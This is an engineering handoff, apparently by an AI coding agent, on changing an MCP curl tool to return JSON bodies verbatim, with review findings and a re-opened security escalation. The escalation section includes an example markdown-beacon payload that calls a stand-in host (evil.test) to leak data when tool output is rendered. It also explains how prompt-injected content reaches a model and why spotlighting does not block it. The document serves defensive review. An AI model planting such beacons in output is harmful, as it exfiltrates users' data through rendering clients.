# Work Handoff: 018 slice 1 — the JSON body path returns verbatim

**Date:** 2026-09-07 | **Branch:** `fix/018-parse-to-validate-return-original-bytes` | **Plan:** `docs/todos/018-P1-json-only-proxy-parse-to-validate-return-original-bytes.md` | **PR:** #39 | **Status:** **partial — the markdown-beacon escalation is RE-OPENED as a design question; see *Round 3* at the foot of this document, which is the current status. Do not merge on the suite being green.**

> **One status, and it is the last section.** *Open escalation* below records the state on 2026-09-07 and *Round 2* records it closed on 2026-09-08; both are dated history and neither is current. Round 3 re-opened it on new information — the director's agent does render tool output as markdown — and measured the recommended remedy unsound (`LESSONS.md` RC-48). Reported by coderabbitai on PR #39, which was right that the header gave conflicting merge guidance.

## Summary

The response body path parsed and re-serialised every JSON document, and the round
trip is not information-preserving: `{"total":5,"total":9}` came back as
`{"total": 9}`, a field silently gone from a tool whose contract is *fetch me this
API's data*. This slice makes the body path parse-to-validate and hand the original
bytes through, decides the persisted artefact's form on the same gate, and routes
anything that is not a composite JSON document to a file with a report.

It is **slice 1 of 2**. The selection machinery (`strictestGrammar`, `isMarkup`,
`isMarkdown`, `contentTypeUndetermined`, most of `utils/content-type.ts`,
`MEDIA_TYPE_HEAD`) and the four published exports are the next slice, and so is
`declared_content_type`. Sliced on the director's call rather than landing whole:
~700-900 production lines and 2,500+ test lines in one diff, on the surface where
`42-ship-what-matters.md`'s convergence rule had already fired three times, against
a P1 worth having sooner.

**016's acceptance criterion 1 is closed by this work** — the artefact is the
origin's octets for a JSON body, which was unreachable until this todo settled who
reads the file. 016 stays open on `jq-query.ts`'s lossy read.

## What was implemented

### The gate — `src/lib/response/processor.ts::classifyBody`

A full `JSON.parse` plus `isCompositeValue`, inheriting no strip cap, used for
**both** the inline body and the artefact. Deliberately not `isDefinitelyJson`,
which answers wrongly in both directions here: it returns `false` above
`STRIP_PATH_MAX_BYTES` (262,144) while the inline cap is 500,000 — so the arm where
the artefact question exists is the arm where it always says "not JSON" — and it
returns `true` for `"<script>x</script>"`, which this gate classifies non-JSON and
routes to the host's own file tooling.

Rejection reasons are a closed four-member vocabulary this repo owns
(`JsonRejectionReason`), so no response byte can reach the report. V8's
`SyntaxError.message` embeds up to ten bytes of the body and the *whole* body when
short, so it is never interpolated; only an anchored `/ at position (\d+) \(line \d+
column \d+\)$/` is read, for an integer.

### The body and the artefact

| Body | Inline | Artefact |
|---|---|---|
| composite JSON | the sanitised form, verbatim otherwise | origin's octets where the sanitise was a no-op, else the sanitised text |
| composite JSON + `jq_filter` | filter output | `Buffer.from(content)` — our serialiser's output |
| empty | `""`, no file | none, unless `save_to_file` |
| anything else | **nothing** | defended text, strictest grammar |

Sanitise runs **before** the classification — RC-44 — because every pass below it
reads the sanitised form. Byte-exactness is therefore conditional and the claim was
narrowed to match.

### Regions — invariants 13 and 16

`defendForInline` has three arms: composite JSON verbatim; a JSON string whose
content is a composite document **divided** and its inner region defended; anything
else scanned undivided. `formatResponse` composes nothing with body bytes — header
text and the `[mcp-curl]` notices are each their own MCP content entry, appended so
`content[0]` stays the body.

Deleted: `defendJsonLeaves`, `serialiseWithoutGrowing`, `MAX_INLINE_DEFENCE_DEPTH`,
`exceedsDefenceDepth`. `parseJsonDocument` collapsed into `isDefinitelyJson`.

## Key decisions

| Decision | Reasoning | Alternatives considered |
|---|---|---|
| Slice the todo; body path first | ~700-900 production lines in one diff on a surface that had already failed to converge three times | Land 018 whole; body path only and stop |
| **Keep Step 2 on the JSON arm** | 018's *What survives* omitted it. Its argument is that the strip stages are markup-enumerative, which does not reach invisible-character/bidi stripping. Measured a byte-for-byte no-op on every fidelity case 018 names | Drop it as the plan's letter implied — bought nothing, cost the defence |
| Invariant 16 restated as **divide**, not *defend each leaf* | Dividing is a property of a pass's input; the per-leaf walk was one mechanism for it. The property has live consumers outside the body path | Retire 16 with the walk (would have left two routes unguarded) |
| Header text and notices as **separate content entries** | Two remote regions may not share a channel, and a separate entry is a stronger boundary than an unoccupiable position | Teach `defendForInline` to recognise the prefix — parsing our own prose to recover a boundary we destroyed |
| Appended, not prepended | `content[0]` has been the body on every release; prepending hands an existing reader the wrong region | Notice first (better reading order, silent break) |
| **Byte-exactness conditional on the sanitise being a no-op** | Raw octets for a BOM-prefixed body put a file on disk `jq_query` cannot open | Unconditional raw octets (the trap); always the sanitised form (loses 016 AC 1) |
| `empty-body` excluded from the save arm | 018 justifies that arm on recoverability; there is nothing to recover from a 204 | Save it anyway with a fourth message arm |
| Filter gate is **parseability**, not the artefact gate | Three questions, not two. A filter runs on a scalar; an artefact's reader does not exist for one | One gate (threw and discarded the body) |
| Version left alone | Director: decide at merge | Bump to 4.0.0 now |

## What to pay attention to during review

- **`defendText` still carries the whole selection machinery**, so the body path
  passes *two* explicit opt-outs — `contentTypeUndetermined: true` and
  `excludeJsonDocuments: false` — to neutralise its callee's defaults. A call site
  defending itself against its callee is a residue, and it closes when slice 2
  deletes that machinery. Until then the comment at `processResponse` is what holds
  the second opt-out in place. **Do not remove it**: without it `isDefinitelyJson`
  re-enables the exemption for a bare-scalar body and no strip stage runs (RC-39).
- **`classifyBody` parses without a size cap, on purpose**, and that is the subject
  of the declined performance finding below. If the deployment assumption changes,
  that decline changes with it.
- **Three parses of overlapping bytes per request** in the growth band. Declined on
  the same population call; the fix (thread the parsed value through) is recorded.
- **My own tests were false-green four times**, all the same shape: an
  `application/json` fixture is strip-exempt, so the defended text equals the origin
  bytes and the assertion cannot discriminate. The artefact gate had no teeth at all
  until a non-UTF-8 body was used. If you add a case here, ask what would still pass
  with the guard removed.

## Known issues and limitations

- **`docs/todos/016` stays open** on `jq-query.ts::executeJqQuery`'s
  `readFile(…, "utf-8")`. Its AC 1 is now closed.
- **NDJSON and other `application/*` multi-document bodies are corrupted** on the
  artefact — see *Declined*, deferred with a trigger.
- **`afterResponse` hooks no longer observe header text**, because it is a separate
  content entry and `hook-executor.ts` reads `content[0].text`. Observation-only
  hook, no runtime error. Recorded, not fixed.
- **`JqQueryResult` is still a 1-tuple** while `ToolResult` is now an array, so the
  two tool results disagree about their own shape.
- **Twelve stale-prose instances** were reported, of which the two that matter ship
  to npm: `docs/custom-tools.md` and `docs/architecture/architecture.md` state the
  JSON exemption **backwards** relative to what this branch does. Not fixed.
- Three pre-existing `tsc` errors in `src/lib.test.ts`,
  `src/lib/response/post-processor.test.ts`, `src/lib/schema/schema.test.ts` — all
  present at the base ref.

## Testing summary

**Runner and mode:** `npx vitest run --reporter=json --outputFile=<path>`, verdict
parsed from the structural counts. `CLAUDE.md`'s caveat applies — vitest is not on
the list of runners whose structured output is trusted here, so treat this as a
strong signal and not a certification.

**Final:** **1,334 passed, 7 skipped, 2 failed.** Both failures are
`src/lib/response/strip-blocks.test.ts`'s ReDoS wall-clock budgets. Across eleven
runs the failing set moved every time (1, 2, 1, 1, 2, 1, 2, 1, 1, 2, 2) and the file
is **not in this branch's diff** — verified with `git diff --name-only`. That is
`docs/todos/013`. `performance-oracle` confirmed it independently against `git
archive` of both refs.

**New tests:** 50 cases in `src/lib/tools/curl-execute.json-passthrough.test.ts` at
`executeCurlRequest`, which is the outermost boundary a real input reaches — a unit
assertion on `defendForInline` passed throughout while the shipped path still
rewrote the body. ~105 existing cases re-pointed.

**One timing guard replaced with a structural pair** rather than re-thresholded: its
premise (an inline arm and an over-cap arm for one body class) no longer exists, and
its own assertion caught that. One fewer wall-clock guard in 013's class.

**Teeth probed — every fix, and two probes changed the work:**

| Probe | Failed |
|---|---|
| artefact gate → always defended text | the non-UTF-8 case, uniquely |
| divider removed | 15, incl. the jq string-leaf splice |
| non-JSON arm no longer saves | 9 AC3/4/5 cases |
| body re-defended | 5, incl. markup-in-values |
| header entry merged back | the two-region case |
| `excludeJsonDocuments` reverted | the bare-scalar artefact case |
| sanitise-before-classify reverted | the BOM case |
| empty-body exclusion reverted | 3 |
| filterable gate reverted | 2 |
| double notice restored | **nothing, until a case was written for it** |

That last row is the lesson: a fix with no failing test is a fix nothing will keep.

## Commit history

```
fa4c8c1 fix(response): close the ordinary-response defects round 1 found
089b7f6 fix(response): close four review findings — two P1, one P2, one P3
a70272b docs(profile): correct §8 — main requires 0 approvals and no status check
175d028 docs(architecture): restate invariants 1a, 14 and 16 for the JSON pass-through
d48c72b feat(response)!: return a JSON body verbatim; report and save everything else
```

`a70272b` is unrelated to 018 and is deliberately its own commit.

## Review context

**Suggested order:** `docs/todos/018` (the plan, and its work log) →
`processor.ts::classifyBody` → `processor.ts::defendForInline` →
`processor.ts::processResponse`'s fork and save arm → `curl-execute.ts`'s content
array → `ARCHITECTURE.md` invariants 1a, 14, 16 → `LESSONS.md` RC-37 through RC-46.

**Related:** `ARCHITECTURE.md` invariants 1, 1a, 7, 10, 11, 13, 14, 16.
`docs/todos/016` (open), `014` (superseded in fact, left open), `010`, `017`, `004`,
`013`, `003`, `012`.

## Reality Corrections

Ten RCs, RC-37 to RC-46, all filed in `LESSONS.md` with full detail. Summarised here
rather than duplicated:

- **RC-37** — deleting the per-leaf walk removed the region-wise *divider*, and
  invariant 16 had two live consumers outside the body path.
- **RC-38** — 018's *What survives* omitted Step 2; the non-JSON artefact was taking
  the origin's declared grammar rather than the strictest.
- **RC-39** — the callee's default cancelled the grammar the caller asked for.
  Reverses RC-10 round 4's scalar exemption, because 018 removed its premise.
- **RC-40** — `savedMessage` re-derived JSON-ness from the remote-written header
  inside a branch where the gate had already answered.
- **RC-41** — the `[mcp-curl]` notice was a second join in the function I had just
  fixed. **K-4**: my sweep was "header text joined to body", not "anything joined".
- **RC-42** — the two V8 message families are not disjoint; disjointness is a
  property of message *length*.
- **RC-43** — Step 2's detection side effect was lost on every saved JSON body.
- **RC-44** — the gate classified bytes that every pass below it does not read.
- **RC-45** — one gate made to answer two questions; the stricter answer discarded
  the response.
- **RC-46** — the fix kept an exception for the safe case, and the exception was the
  defect.

_No POST-AUDIT annotations: the plan is a todo, not a `docs/plans/` document, and its
corrections are recorded in its own work log._

## Open escalation — READ BEFORE MERGING

**One P1 is unanswered.** `security-sentinel` established, and I verified, that
018's justification for withdrawing the strip stages from JSON is **false as
shipped**:

- 018's reasoning: the strip stages "only ever caught the marked-up subset of a class
  the **spotlight boundary** covers in full".
- `tools/index.ts::NO_CONFIG = Object.freeze({})` on the shipped binary path and
  `McpCurlServer._config = {}` on the library path both leave `enableSpotlighting`
  undefined, and `docs/architecture/architecture.md:220` says **"Off by default."**
- So as configured there is no boundary at all. A JSON body carrying
  `![x](https://evil.test/p.gif?d=leak)` in a string value reaches the model
  byte-identical, and an MCP client that renders tool text as markdown fetches that
  URL with no model cooperation.
- And even with spotlighting on, textual sentinels do not stop a renderer issuing the
  request. The argument holds for injection *prose* and does not reach the beacon,
  the `javascript:` link, or `<script>`.

**The recommendation on the table, not yet decided:** keep `stripMarkdownBeacons` on
the JSON arm and withdraw only the paired-token stages. The corruption 018 exists to
fix comes *entirely* from paired-token splicing; `stripMarkdownBeacons` does not pair
and is byte-preserving on any document containing no beacon. That keeps byte-exactness
for every legitimate payload, keeps the beacon and dangerous-scheme defence, and costs
exactness only for a document that actually carries a beacon.

The alternative is to default `enableSpotlighting` to on, which makes the shipped
binary match the argument in invariant 1a but does not close the renderer path.

`register-all-tools.test.ts` currently **pins the withdrawal as intentional**
(`expect(text).toContain("evil.test")`), which is why this needs a decision rather
than a patch.

## Declined findings

**Declined on the director's population call, 2026-09-07** — this MCP is used by
internal staff only and no API call will return 10 MB. Recorded here so a later round
cites this rather than re-opening it, per `.claude/rules/03-divergence.md`.

| Finding | Severity as reported | Why declined |
|---|---|---|
| `classifyBody`'s uncapped parse is a 29x memory amplifier — 9.5 MB of `[[[[…]]]]` → 1390 ms and 275 MB retained (I verified independently; the oracle measured 21.7x) | P1 | The mechanism is real and the population is empty. Amplification is proportional to body size; at the sizes this deployment sees (≤ a few hundred KB) it is a latency blip, not heap exhaustion. **Trigger to re-open: any external or untrusted origin becomes reachable, or a response class above ~1 MB appears.** |
| Three parses of overlapping bytes per request in the growth band | P2 | Same call. The fix — have `classifyBody` return the parsed value and thread it — is recorded in the RC trail and is a strict win *after* a depth bound, not before |
| Every non-JSON body now writes a durable file with no eviction; unbounded under `MCP_CURL_OUTPUT_DIR` | P2 | Internal-staff volume. **Trigger: an operator sets `MCP_CURL_OUTPUT_DIR` for sustained automated use** — then the directory needs a cap before that runs |
| `Date.now()` filename collision (pre-existing, made more reachable) | P2 | Needs two requests to one URL inside a millisecond. Pre-existing; `docs/todos/012` owns it |
| Byte-exactness claim does not hold for ZWJ / VS-16 / long whitespace runs | P2 | The mechanism predates this branch and is `sanitize.ts`'s accepted tolerance. The *claim* was narrowed in code (RC-44), which was the in-scope half |
| `savedPathFrom` cleanup wrapper duplicated across two suites | P3 | Test-authoring convention; no drift consequence |
| `diskBytes` and `maxSize` measured on different representations for a non-UTF-8 body | P3 | Requires a non-UTF-8 body crossing the cap on decode only |
| Notice provenance now last rather than first | P3 | Declined by the reviewer itself as hardening; the same additive forgery existed before |

**Deferred with a trigger** (the only deferral, and it is a P2 rather than a P1, so
it is filed as a note here rather than as a new todo — no todo was created this run):

- **NDJSON and other `application/*` multi-document bodies.** Before this slice,
  `application/x-ndjson` selected no strip stage, so the persisted copy was intact.
  It now takes the strictest grammar and `stripHtmlComments` can delete across
  document boundaries in the only copy. **Trigger: any consumer fetches NDJSON —
  Elasticsearch bulk, Docker logs, a streaming API.** The fix is a `multi-document`
  verdict on `classifyBody` with per-document defence, which is slice-2 sized.

## Follow-up work

- [ ] **The open escalation above.** Nothing should merge until it is answered.
- [ ] **Slice 2 of 018** — the selection machinery, the four published exports,
      `declared_content_type`. MAJOR.
- [ ] The two npm-published docs that state the exemption backwards.
- [ ] `afterResponse`'s header visibility, and `JqQueryResult` vs `ToolResult`.
- [ ] `docs/todos/016` — `jq-query.ts`'s lossy read.
- [ ] `docs/todos/013` — the suite still has no reliable green.

### Outstanding Todos

| File | Priority | Description | Source |
|---|---|---|---|
| `docs/todos/018-P1-…md` | P1 | Slice 1 landed; slice 2 open. Work log records what and why | this run |
| `docs/todos/016-P2-…md` | P2 | AC 1 now closed by this branch; open on `jq-query.ts` | prior branch |
| `docs/todos/014-P1-…md` | P1 | Superseded in fact; left open deliberately | this run marked it |
| `docs/todos/013-P2-…md` | P2 | The suite's timing guards; two files in the class now | pre-existing |

**This run created no new todo files and closed none.** The branch is net-neutral on
its own todos: the NDJSON deferral is recorded above with its trigger rather than
filed, because an out-of-scope P2 is declined and not deferred — and the two
in-scope-but-slice-2 items belong to 018, which already exists.

### Resolved Todos

_None._ `docs/todos/018` is not resolved — slice 2 remains, and the open escalation
above may change its design. **No todo file was deleted by this run.**

---

## Surface 2 — round 1, 2026-09-07

**Certification: withheld.** One in-scope P1 is escalated and unanswered.

**Scope reviewed:** `450e37a9fc8fc9886c8188764c61c81e8156b083..HEAD`, resolved by
`git merge-base --fork-point origin/HEAD HEAD` (arm 1). Roster: the 6 configured in
`sixees-workflow.local.md` unioned with the 4-agent floor, deduped to 8. All 8
returned. `/security-review` ran and its sub-task read the full 239 KB diff from the
persisted path — its inline copy was truncated to a 2 KB preview, which is the
coverage hazard the command warns about.

### Reviewer status

| Reviewer | Floor | Status | Findings |
|---|---|---|---|
| `learnings-researcher` | floor | done | 10 prior RCs. **Cited RC-37/38 as prior art in error** — both are this branch's own, a recurrence of the same mistake the previous round's researcher made with RC-34 |
| `code-simplicity-reviewer` | floor | findings | 1 P1. Declined all six things I flagged as possible over-building, each with a reason |
| `security-sentinel` | floor | findings | 2 P1, 1 P2, 1 P3. Ran probes against a live socket and both refs |
| `data-integrity-guardian` | floor | findings | 1 P1, 5 P2, 2 P3 |
| `typescript-reviewer` | optional | findings | 1 P1, 3 P2 |
| `architecture-strategist` | optional | findings | 1 P1, 3 P2. Withdrew one finding after re-reading a region mid-edit |
| `pattern-recognition-specialist` | optional | findings | 2 P3, plus a P1-class defect correctly routed out of its lane |
| `performance-oracle` | optional | findings | 1 P1, 2 P2. Pinned every measurement to `git archive` of committed refs |

**Two reviewers reported reading a tree that had moved under them**, because I was
editing while they ran. That is my error and the same one the previous round
recorded. Both re-verified their load-bearing claims; `performance-oracle`'s numbers
were unaffected because it archived the refs.

### Findings by class

**Five distinct P1s.** Four fixed, one escalated and open.

| Class | Severity | Reviewers | Disposition |
|---|---|---|---|
| `broken-contract` — the `[mcp-curl]` notice prefix re-splices a JSON body | **P1** | typescript, security, architecture, data-integrity (**4**) | **fixed** — RC-41 |
| `fail-open-default` — the callee's default cancelled the requested grammar | **P1** | code-simplicity | **fixed** — RC-39 |
| `stale-observation` — the gate classified pre-sanitise bytes (BOM) | **P1** | data-integrity | **fixed** — RC-44 |
| `unbounded-growth` — uncapped parse is a 29x amplifier | **P1** | performance | **declined** — population, see above |
| `unescaped-sink` — the strip withdrawal's premise is false as shipped | **P1** | security | **ESCALATED, OPEN** |
| `misplaced-decision` — the route clause read the remote header | P2 | pattern, security | **fixed** — RC-40 |
| `lost-code-path` — Step 2's detection lost on saved bodies | P2 | security | **fixed** — RC-43 |
| `lost-code-path` — scalar + `jq_filter` threw and discarded the body | P2 | data-integrity | **fixed** — RC-45 |
| `missing-validation` — empty body wrote a zero-byte artefact | P2 | typescript, data-integrity | **fixed** — RC-44 |
| `duplicated-logic` — the notice emitted twice | P2 | security-review | **fixed** — RC-46 |
| `convention-drift` — the new suite was green only on darwin | P2 | typescript | **fixed** |
| `unchecked-assertion` — invariant 16 enforced by enumeration; NDJSON unenumerated | P2 | architecture | **deferred with trigger** |
| `broken-contract` — invariant 11: this slice is a MAJOR on its own | P2 | architecture | **answered** — version decided at merge, per the director |
| `stale-comment` — 12 instances, 2 published to npm | P2 | architecture, pattern, typescript | **partly fixed** — the ones I created; the published pair is outstanding |
| `injectable-input` — remote-chosen `position` integer | P3 | security | **fixed** — RC-42 |
| 6 further P2/P3 | P2/P3 | various | **declined** — see the table above |

- Rejected: **0.** Every finding carried a confirmed instance and a failure scenario.
- **Fixed: 11. Declined: 8. Deferred: 1. Answered: 1. Escalated: 1.**
- Todos created: **0.** Todos closed: **0.**

### Verified claims

| Claim | Verdict |
|---|---|
| "Tests pass" | Verified — JSON reporter, structural counts, eleven runs |
| "JSON bodies are byte-exact" | **Refuted as stated, then narrowed.** True where Step 2 is a no-op; false for ZWJ, VS-16, long whitespace runs, and any attack codepoint. The claim in code was corrected |
| "Step 2 still reaches the body" | **Refuted for saved routes**, verified for inline. Fixed, RC-43 |
| "`jq_query` defends the raw-octet artefact" | Verified by `security-sentinel` end to end |
| "The depth fail-open is gone, not bounded" | Verified — probed to nesting depth 1,000,000, no `RangeError` |
| "No response byte reaches the report" | **Refuted** — a remote-chosen integer did. Fixed, RC-42 |
| "The strip withdrawal is covered by spotlighting" | **Refuted** — off by default on both entry points. **This is the open escalation** |
| "018's premise: `tools/jq-query.ts` consumes `json-lexeme`" | Refuted at audit time — it does not. 018 corrected |

### Coverage caveats

- **Three reviewers hold no `Bash`** and read files at HEAD rather than applying the
  range. All three declared it.
- **The tree moved during the round.** My error, recorded above.
- **`/security-review`'s inline diff was truncated** to 2 KB of 239 KB; its sub-task
  was pointed at the full persisted file and confirmed reading it whole. A positive
  signal means it replied, not that its own scope resolution was complete.
- **Surface 3 has not run.** No bot reviewer has seen this branch, and nothing is
  pushed.
- **Round 1's fixes are themselves unreviewed.** Everything in `089b7f6` and `fa4c8c1`
  was applied after its reviewer returned. They are teeth-probed and the suite is
  green, but no reviewer has read them. **A round 2 against the frozen tree is the
  conservative call**, and given round 1 produced five P1s it is the one I would take.

### Blockers

**One.** The open escalation under *Open escalation* above. The convergence rule has
fired on this surface: five P1s in one round, and each of my own fixes created the
next finding — the strictest-grammar fix produced the NDJSON regression, the
`excludeJsonDocuments` fix produced a contradiction in an invariant I had just
written, and deleting the depth bound produced the amplifier. That is a signal about
the change's intricacy, not only about its defects.

---

# Round 2 — the scope call, and the escalation it closed

**2026-09-08.** Status of the previous section's open escalation: **closed by the
director.** It asked whether `stripMarkdownBeacons` should stay on the JSON arm given
that `enableSpotlighting` is off by default. The answer — *"Do not over engineer
security, prompt injection, etc. The consumers of this MCP is mainly me and half a dozen
internal developers"* — settles it as no. Recorded in `LESSONS.md` RC-47 and binding per
`.claude/rules/03-divergence.md`; a later round proposing the reversal cites RC-47.

`docs/todos/018` → *Round 2* carries what changed and what is still open. Not repeated
here.

## Two corrections to the section above

**RC-40 through RC-43 do not exist in `LESSONS.md`.** They were assigned in this handoff
and never promoted to the ledger, and seventeen source comments cited them as durable
facts. Two comment auditors found it independently, from separate batches. The citations
are re-pointed to RC-44 and RC-46, which hold the same facts. **The references to
RC-40–43 in the section above are left as written** — retro-editing a handoff would hide
the divergence this note exists to record — so read them as history, not as ledger
pointers. RC-47's closing paragraph carries the general lesson: an RC number is durable
only once it is in `LESSONS.md`.

**The previous section's test claims were narrower than the change.** It reported that
the branch's own suite covered the design; round 2's re-specification made 85 cases fail,
55 of them one class. That is not a defect in the earlier work — the design changed under
them — but the number I gave the operator when proposing the change ("~9 tests lose their
premise") was wrong by an order of magnitude, and the reason is worth keeping: I priced
the blast radius from the diff I intended rather than from the shared symbol
`classifyBody`, which is read by both the body gate and `defendForInline`. RC-47 records
it as the lesson.

## Certification

**Withheld, and for one reason only.** Everything in round 2 is teeth-probed, the build
is clean, and the suite is green apart from `strip-blocks.test.ts`'s pre-existing ReDoS
wall-clock flakes. But **round 2's changes are unreviewed** — no reviewer has read them,
and round 1's five P1s came from exactly this position. Surface 3 (bot reviewers) has
never run on this branch at all.

One near-miss worth naming, because it was caught by a compiler rather than by me: a span
anchor in a comment-cutting edit was not contiguous, and the replacement silently deleted
`strictestGrammar` and `exceedsStripCap`. `npm run build` caught it; no test would have,
because the file did not compile. **Mechanical comment edits over non-contiguous blocks
need the build run between each one**, not at the end of a batch.

Nothing pushed. No PR. Push and merge remain the operator's.


---

# Round 3 — PR #39, Surface 3 (bot review), 2026-09-08

**This section is the current status.** Everything above it is dated history.

Three bots reviewed: `chatgpt-codex-connector` (triggered), `coderabbitai` (reviewed
unprompted) and `copilot-pull-request-reviewer`. **18 comments, 11 distinct classes.**

## The director's scope call, restated and widened

> *"Do not over engineer the solution. I am the only user of this MCP via a locally
> orchestrated Agent. We do not need to over stress security and size of payloads."*

Binding per `.claude/rules/03-divergence.md`, and consistent with the 2026-09-07 call
recorded under *Declined findings*. **One answer widened it rather than narrowing it:**
that agent **does** render tool output as markdown, so the markdown-beacon population is
not empty and RC-47's judgement on that one finding is reversed on new information. The
rest of RC-47 stands.

## Changes Made

| Comment | Reviewer | Category | Action taken |
|---|---|---|---|
| Byte-exactness asserted unconditionally (×4 sites) | codex, coderabbitai ×2, copilot | Fix needed | `savedMessage` gained `originBytesExact` and states which of the two arms wrote the file; the `curl_execute` description now says codepoint removal is the one exception and names the empty-body case; `ARCHITECTURE.md` and `docs/custom-tools.md` still to do — see *Outstanding* |
| `savedMessage` claims exact bytes for a sanitised artefact | codex P2 | Fix needed | Gated on `!filterApplied && sanitiseWasNoOp`. **New test**, teeth-probed |
| `schemas.ts` says headers are prefixed to the text | codex P2 | Fix needed | Rewritten to name `content[1]`. The tool description and the input schema no longer contradict each other |
| `public.ts` promises steps 1-4 always run | codex P2 | Fix needed | Docblock now carries the JSON arm and says the trade is not free. npm-published surface |
| Exit notice says "below", is appended after | codex P2 | Fix needed | "above". The comment records that appending is what points every positional word backwards |
| jq error echoes the origin's content type | coderabbitai | Fix needed | Uses `classified.reason` from the closed vocabulary. **New test**, teeth-probed |
| `"1.50"` fixture is a string | coderabbitai | Fix needed | Now `1.50`, unquoted. A string round-trip could not detect lexeme rewriting — the case discriminated nothing |
| Handoff header contradicts Round 2 | coderabbitai | Fix needed | Header now points at this section as the single current status |
| `afterResponse` sees only `content[0]` | codex P2, coderabbitai | Documentation | Comment corrected — it cited a `ToolResult` tuple type this branch removed. Behaviour unchanged on the director's call; recorded as follow-up |

## Declined Findings

| Comment | Reviewer | Severity | Scope call | Reason declined |
|---|---|---|---|---|
| Drop Step 2 from the JSON arm so JSON is truly byte-exact | codex **P1**, coderabbitai Major | P2 (re-derived from consequence: the data was already altered before this branch; the *claim* is what this branch added) | In scope | Already decided — *Key decisions*: "Keep Step 2 on the JSON arm", measured a byte-for-byte no-op on every fidelity case 018 names. Dropping it costs the invisible-character and bidi defence and the `[injection-defense]` log for a saved body (RC-44). The in-scope half was the claim, and it is narrowed above |
| Todo acceptance criteria 5 and 6 still marked `[x]` | copilot | P3 | In scope | `.claude/rules/03-divergence.md` forbids retro-editing plan text; the POST-AUDIT annotation added in `cd348f9` is the house mechanism for exactly this, and it sits directly above the criteria |
| Restrict the JSON path to trusted origins, or make spotlighting mandatory | coderabbitai Major (CWE-74) | P2 | In scope | Same subject as the beacon escalation, which is re-opened as a design question below rather than declined. Not actioned this round |

## Decisions Revised

| Original decision | New approach | Reason | Reviewer |
|---|---|---|---|
| RC-47: the markdown-beacon population is empty, so `stripMarkdownBeacons` comes off the JSON arm | Population confirmed non-empty; the finding is live again and the remedy is a design question | The director's agent renders tool output as markdown | coderabbitai raised it; the director answered |
| Handoff: *"keep `stripMarkdownBeacons` and withdraw only the paired-token stages"* | **Not implemented — measured unsound** | `stripMarkdownBeacons` pairs `(`…`)` and deletes intervening JSON fields. `LESSONS.md` RC-48 | measured against HEAD |

## Re-opened escalation — the one thing blocking merge

**The beacon defence and whole-document byte-exactness cannot both be had by a
whole-document pass.** RC-48 holds the measurement and the three sound options, each with
its cost. This is a design decision and it is the director's.

## Files Modified

`src/lib/response/processor.ts`, `src/lib/response/formatter.ts`,
`src/lib/server/schemas.ts`, `src/lib/types/public.ts`,
`src/lib/extensible/hook-executor.ts`, `src/lib/tools/curl-execute.ts`,
`src/lib/tools/curl-execute.json-passthrough.test.ts`, `LESSONS.md`, this handoff.

## Outstanding

- The re-opened escalation.
- Suite: 1281 passing, 7 skipped. `strip-blocks.test.ts`'s two ReDoS wall-clock budgets
  fail on most runs — pre-existing, `docs/todos/013`, and not touched by this branch.

**No todo was filed this round, and none was closed.** 4 open against this PR, unchanged.


---

# Round 3, second pass — 2026-09-08

`coderabbitai` reviewed the round-1 fixes and returned **4 comments, 4 classes**. All four
are about text the previous pass wrote, which is `01-known-shapes.md` → **K-16** working as
described: *the newest fix is the least-reviewed text on the branch.* No other bot returned
this pass — `chatgpt-codex-connector` answered each thread with *"To use Codex here, create
an environment for this repo"*, a configuration notice rather than a finding.

## Changes Made

| Comment | Reviewer | Category | Action taken |
|---|---|---|---|
| `schemas.ts` still ends *"so that result is not JSON-parseable"* | coderabbitai Trivial | Fix needed | Deleted. The previous pass rewrote the sentence in front of it and left the old trailing clause, so the field contradicted itself in consecutive sentences |
| `curl_execute` describes the notices as "leading" | coderabbitai Trivial | Fix needed | They are a THIRD content entry after the body and the header entry. Corrected in both places |
| `public.ts` does not say byte identity is conditional | coderabbitai Minor | Fix needed | The docblock now states that `sanitizeAndDetect` is **not** skipped on the JSON arm, so a document carrying U+200B or a threshold-length padding run comes back without it, and names the two exceptions the tool reports |
| The *Outstanding* item naming `ARCHITECTURE.md` and `docs/custom-tools.md` is stale | coderabbitai Minor | Fix needed | Removed — both were fixed in `9baf458`, in the same pass that wrote the item |

## Declined Findings

| Comment | Reviewer | Severity | Scope call | Reason declined |
|---|---|---|---|---|
| Run the full `defendText` pipeline over the non-JSON artefact before saving, and compute `originBytesExact` from the final bytes | coderabbitai Major (CWE-74) | P2 | In scope | **Reverses a binding RC.** `LESSONS.md` RC-47 removed exactly this after measuring the cost: `stripHtmlComments` deletes the `<!-- trace-id: … -->` a framework puts its diagnostic in, on the one copy of a 500 page the operator has. `.claude/rules/03-divergence.md` → *Settled conflicts stay settled* requires a later round proposing the same reversal to be answered by citing the RC rather than re-litigating it, and that is what the reply does. The artefact's reader is the operator's own file tooling, not the model; `savedMessage` does not offer it to `jq_query`, and it names what the file holds |

## Stop condition

The operator's rule: **at most three rounds, stop when a round returns five or fewer
comments with no P1s.** This pass returned **4 comments and no P1s**, so the condition is
met — reported for the operator to call, not applied here.

**One thread remains open by design**: `PRRT_kwDOQnZcNs6gJ1tW`, the markdown-beacon
escalation, which is RC-48's design question and the only thing blocking merge.
